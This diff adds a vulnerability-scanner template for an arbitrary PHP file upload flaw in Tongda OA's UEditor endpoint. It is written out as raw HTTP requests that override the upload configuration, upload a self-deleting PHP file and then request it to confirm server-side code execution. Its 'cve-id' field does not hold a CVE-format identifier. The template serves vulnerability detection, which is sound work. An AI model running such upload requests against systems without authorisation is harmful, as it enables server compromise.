@@ -1,0 +1,62 @@
+id: tongda-oa-ueditor-action-upload-php-writefile
+info:
+  name: Tongda OA UEditor PHP File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Tongda OA UEditor PHP action_upload.php allows arbitrary file upload, leading to potential remote code execution.
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: CT-416616
+http:
+  - raw:
+      - |
+        GET /inc/expired.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Office Anywhere 2017"
+        part: body
+
+  - raw:
+      - |
+        POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+        X-Requested-With: XMLHttpRequest
+
+        ------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="CONFIG[fileFieldName]"\r\n\r\nffff\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="CONFIG[fileMaxSize]"\r\n\r\n1000000000\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="CONFIG[filePathFormat]"\r\n\r\n{{filename}}\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\r\n\r\n.php\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="ffff"; filename="test.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5({{rand}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="mufile"\r\n\r\nsubmit\r\n------WebKitFormBoundary{{boundary}}--\r\n
+    extractors:
+      - type: regex
+        internal: true
+        name: file_path
+        regex:
+          - "{{filename}}.php"
+
+  - raw:
+      - |
+        GET /{{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5}}"
+        part: body
+
+variables:
+  boundary: '{{rand_text_alphanumeric(8)}}'
+  filename: '{{rand_text_alphanumeric(6)}}'
+  rand: '{{rand_int(40000, 44800)}}'
+  md5: '{{md5(rand)}}'
